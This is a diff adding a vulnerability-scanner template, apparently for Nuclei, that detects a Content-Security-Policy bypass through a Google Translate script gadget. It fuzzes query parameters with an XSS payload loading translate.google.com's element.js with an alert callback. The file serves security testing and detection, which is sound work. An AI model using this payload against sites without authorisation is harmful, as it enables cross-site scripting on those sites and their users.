@@ -1,0 +1,55 @@
+id: google-translate-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Translate
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-translate,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_translate_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_translate_csp_xss == true"
+# digest: 490a0046304402206a3e070c829f176ee3a370ada628fa7b0df512bd98385572dabd987d41cf0d6b02206d2070370619502b235c199418a4dc3478f8c048f533d4a560da670da4efe123:922c64590222798bb761d5b6d8e72950
